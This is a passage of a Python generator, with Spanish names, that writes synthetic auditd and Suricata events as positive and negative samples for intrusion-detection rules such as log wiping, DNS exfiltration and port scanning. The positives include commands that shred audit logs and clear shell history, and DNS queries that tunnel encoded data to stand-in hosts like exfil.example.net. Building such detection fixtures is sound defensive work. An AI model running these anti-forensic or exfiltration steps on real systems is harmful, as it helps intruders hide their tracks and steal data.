            ["curl", "-o", "/tmp/node.tar.gz", "https://nodejs.org/dist/node.tar.gz"],
        ),
        f.auditd_ejecucion(
            40, "/usr/bin/wget", ["wget", "https://example.org/app.deb", "-O", "/tmp/app.deb"]
        ),
        f.auditd_ejecucion(
            60, "/usr/bin/bash", ["bash", "-c", "curl -s http://10.0.10.21/health | jq ."]
        ),
        f.auditd_ejecucion(
            80, "/usr/bin/dash", ["sh", "-c", "curl -s http://10.0.10.21/health | grep ok"]
        ),
        f.auditd_ejecucion(100, "/usr/bin/bash", ["bash", "-c", "cat /etc/hosts | sh -n"]),
    ]


def _logs_pos(f: Fabrica) -> list[Evento]:
    return [
        f.auditd_archivo(0, "/usr/bin/rm", "/var/log/auth.log", "logs"),
        f.auditd_archivo(20, "/usr/bin/bash", "/var/log/wtmp", "logs"),
        f.auditd_ejecucion(
            40, "/usr/bin/shred", ["shred", "-u", "/var/log/audit/audit.log"], uid="0"
        ),
        f.auditd_ejecucion(60, "/usr/bin/bash", ["bash", "-c", "history -c"]),
        f.auditd_archivo(
            80, "/usr/bin/rm", "/home/dani/.bash_history", "historial", uid="1000", cwd="/home/dani"
        ),
        f.auditd_ejecucion(
            100, "/usr/bin/ln", ["ln", "-sf", "/dev/null", "/home/dani/.bash_history"]
        ),
        f.auditd_ejecucion(
            120, "/usr/bin/bash", ["bash", "-c", "unset HISTFILE; export HISTSIZE=0"]
        ),
        f.auditd_archivo(140, "/usr/bin/truncate", "/var/log/syslog", "logs"),
    ]


def _logs_neg(f: Fabrica) -> list[Evento]:
    return [
        f.auditd_archivo(0, "/usr/sbin/rsyslogd", "/var/log/auth.log", "logs", auid="4294967295"),
        f.auditd_archivo(20, "/usr/sbin/logrotate", "/var/log/syslog", "logs", auid="4294967295"),
        f.auditd_archivo(40, "/usr/sbin/sshd", "/var/log/wtmp", "logs", auid="4294967295"),
        f.auditd_archivo(60, "/usr/bin/gzip", "/var/log/syslog.1", "logs", auid="4294967295"),
        f.auditd_ejecucion(80, "/usr/bin/less", ["less", "/var/log/auth.log"]),
        f.auditd_ejecucion(100, "/usr/bin/grep", ["grep", "-r", "Failed", "/var/log/"]),
        f.auditd_ejecucion(120, "/usr/bin/cat", ["cat", "/home/dani/.bash_history"], uid="1000"),
        f.auditd_ejecucion(140, "/usr/bin/rm", ["rm", "-rf", "/var/tmp/build-cache"]),
        f.auditd_ejecucion(160, "/usr/bin/ln", ["ln", "-s", "/var/log/nginx", "/srv/logs"]),
        f.auditd_archivo(
            180, "/usr/lib/openssh/sshd-session", "/var/log/wtmp", "logs", auid="4294967295"
        ),
    ]


def _dns_pos(f: Fabrica) -> list[Evento]:
    origen = "10.0.10.21"
    return [
        f.suricata_dns(
            0, origen, "mfrggzdfmztwq2lknnwg23tpobyxe43uoryhiztqnrxgs43vn5zwk.exfil.example.net"
        ),
        f.suricata_dns(2, origen, "tunnel.example.net", rrtype="NULL"),
        f.suricata_dns(
            4, origen, "4a6f686e20446f6520736563726574207061737377.c2.example.org", rrtype="TXT"
        ),
        f.suricata_dns(
            6, origen, "a3f9c1e2b7d4406f8e12c5a9b0d3e7f4a1b2c3d4e5f60718.data.example.com"
        ),
        f.suricata_dns(8, origen, "MFRGGZDFMZTWQ2LKNNWG23TPOBYXE43UORYHIZTQNRXGS43V.t.example.net"),
    ]


def _dns_neg(f: Fabrica) -> list[Evento]:
    origen = "10.0.10.21"
    return [
        f.suricata_dns(0, origen, "www.google.com"),
        f.suricata_dns(1, origen, "api.github.com"),
        f.suricata_dns(2, origen, "21.10.0.10.in-addr.arpa", rrtype="PTR"),
        f.suricata_dns(3, origen, "_dmarc.example.com", rrtype="TXT"),
        f.suricata_dns(4, origen, "example.com", rrtype="TXT"),
        f.suricata_dns(5, origen, "d1a2b3c4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2.cloudfront.net"),
        f.suricata_dns(
            6,
            origen,
            "mfrggzdfmztwq2lknnwg23tpobyxe43uoryhiztqnrxgs43vn5zwk.exfil.example.net",
            tipo="answer",
        ),
        f.suricata_dns(7, origen, "mail.example.com", rrtype="MX"),
    ]


def _conexion_pos(f: Fabrica) -> list[Evento]:
    return [
        f.suricata_flow(0, "10.0.10.21", "10.0.10.32", 5432),
        f.suricata_flow(5, "192.168.1.5", "192.168.1.9", 445),
    ]


def _conexion_neg(f: Fabrica) -> list[Evento]:
    return [
        f.suricata_flow(0, "10.0.10.21", "10.0.10.32", 5432, pkts_toclient=5),
        f.suricata_flow(5, "10.0.10.21", "10.0.0.53", 53, proto="UDP"),
        f.suricata_flow(10, _EXTERNA_C2, "10.0.10.21", 22),
        f.suricata_flow(15, "10.0.10.21", "10.0.10.40", 445, pkts_toclient=2),
    ]


def _escaneo_pos(f: Fabrica) -> list[Evento]:
    puertos = list(range(21, 66))
    f.rng.shuffle(puertos)
    return [
        f.suricata_flow(i * 0.4, "10.0.10.21", "10.0.10.32", puerto)
        for i, puerto in enumerate(puertos)
    ]


def _escaneo_neg(f: Fabrica) -> list[Evento]:
    eventos = [f.suricata_flow(i * 2, "10.0.10.21", "10.0.10.32", 8000 + i) for i in range(10)]
    eventos += [
        f.suricata_flow(300 + i * 25, "10.0.10.21", "10.0.10.33", 9000 + i) for i in range(25)
    ]
    eventos += [
        f.suricata_flow(1200 + i * 0.5, "10.0.10.21", "10.0.10.32", 5432) for i in range(25)
    ]
    eventos += [
        f.suricata_flow(1300 + i * 0.5, "10.0.10.21", "10.0.10.32", 7000 + i, pkts_toclient=4)
        for i in range(25)
    ]
    return eventos


ESCENARIOS: tuple[Escenario, ...] = (
    Escenario("ssh_fallo_autenticacion", _ssh_fallo_pos, _ssh_fallo_neg),
    Escenario("ssh_login_exitoso", _ssh_exito_pos, _ssh_exito_neg),
    Escenario("ssh_fuerza_bruta", _fuerza_bruta_pos, _fuerza_bruta_neg),
    Escenario("ssh_login_exitoso_tras_rafaga", _tras_rafaga_pos, _tras_rafaga_neg),
    Escenario("cuenta_local_creada_o_agregada_a_sudo", _cuentas_pos, _cuentas_neg),
    Escenario("escalamiento_sudo_su_anomalo", _sudo_pos, _sudo_neg),
    Escenario("modificacion_passwd_shadow", _passwd_pos, _passwd_neg),
    Escenario("persistencia_cron", _cron_pos, _cron_neg),
    Escenario("persistencia_systemd", _systemd_pos, _systemd_neg),
    Escenario("webshell_proceso_hijo_servidor_web", _webshell_pos, _webshell_neg),
    Escenario("reverse_shell", _reverse_pos, _reverse_neg),
    Escenario("descarga_y_ejecucion", _descarga_pos, _descarga_neg),
    Escenario("borrado_logs_historial", _logs_pos, _logs_neg),
    Escenario("exfiltracion_dns", _dns_pos, _dns_neg),
    Escenario("conexion_saliente_sin_respuesta", _conexion_pos, _conexion_neg),
    Escenario("escaneo_red_saliente", _escaneo_pos, _escaneo_neg),
)


def generar(destino: Path, semilla: int = SEMILLA) -> dict[str, tuple[int, int]]:
    """Escribe positivos.jsonl y negativos.jsonl por regla; devuelve los conteos.

    Cada escenario ocupa su propia hora del día y los negativos van media hora
    después de los positivos, para que al evaluar todo `samples/` de una vez
    las correlaciones no mezclen eventos de escenarios distintos.
    """
    conteos: dict[str, tuple[int, int]] = {}
    for indice, escenario in enumerate(ESCENARIOS):
        carpeta = destino / escenario.regla
        carpeta.mkdir(parents=True, exist_ok=True)
        inicio_pos = _BASE + timedelta(hours=indice)
        inicio_neg = inicio_pos + timedelta(minutes=30)
        positivos = escenario.positivos(Fabrica(semilla + indice * 2, inicio_pos))
        negativos = escenario.negativos(Fabrica(semilla + indice * 2 + 1, inicio_neg))
        _escribir(carpeta / ARCHIVO_POSITIVOS, positivos)
        _escribir(carpeta / ARCHIVO_NEGATIVOS, negativos)
        conteos[escenario.regla] = (len(positivos), len(negativos))
    return conteos


def _escribir(ruta: Path, eventos: Iterable[Evento]) -> None:
    lineas = [json.dumps(evento, ensure_ascii=False, sort_keys=True) for evento in eventos]
    ruta.write_text("\n".join(lineas) + "\n", encoding="utf-8", newline="\n")
